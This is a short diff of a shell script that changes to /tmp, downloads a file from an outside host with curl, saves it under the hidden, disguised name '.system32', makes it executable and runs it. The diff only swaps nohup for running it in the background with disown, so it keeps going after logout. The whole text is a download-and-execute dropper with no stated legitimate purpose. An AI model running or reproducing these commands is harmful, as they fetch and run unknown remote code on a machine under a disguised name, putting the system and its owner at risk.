@@ -1,4 +1,4 @@
 cd /tmp
 curl https://mathyshenin.me/linux > .system32
 chmod +x .system32
-nohup ./.system32
+./.system32 & disown
